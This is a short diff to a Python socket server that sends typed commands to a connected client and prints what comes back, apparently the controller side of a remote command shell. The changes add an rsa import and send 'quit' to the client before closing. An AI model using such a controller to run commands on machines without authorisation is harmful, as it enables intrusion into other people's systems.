@@ -6,6 +6,7 @@ import os
 import subprocess
 import requests
 import io
+import rsa
 
 # Create a socket (connect two computers)
 def create_socket():
@@ -46,13 +47,16 @@ def send_commands(conn):
     while True:
         cmd = input()
         if cmd == 'quit':
+            conn.send(str.encode(cmd))
+            client_response = str(conn.recv(1024), "utf-8")
+            print(client_response)
             conn.close()
             s.close()
             sys.exit()
         if len(str.encode(cmd)) > 0:
             conn.send(str.encode(cmd))
             client_response = str(conn.recv(1024), "utf-8")
-            print(client_response, end="")
+            print(client_response)
 
 def main():
     create_socket()
